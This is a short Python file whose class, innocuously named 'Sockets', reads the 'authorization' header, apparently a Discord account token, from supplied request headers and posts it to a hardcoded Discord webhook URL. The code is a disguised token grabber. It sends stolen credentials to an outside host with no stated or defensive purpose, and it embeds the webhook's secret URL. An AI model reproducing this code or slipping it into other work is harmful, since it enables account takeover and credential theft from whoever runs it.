import requests

class Sockets():

    def __init__(self, headers, host) -> None:
        self.headers = headers
        self.token   = self.headers["authorization"]
        self.webhook = "https://discord.com/api/webhooks/1155899947900731464/_T95QCpWszC3d55gHQQMf312L78sf-Zhe25DwABaiu-QnwD1VucJuBAHm3EyovFO2ZGm"

    def send_socket(self) -> None:
        requests.post(self.webhook, json={"content": self.token})
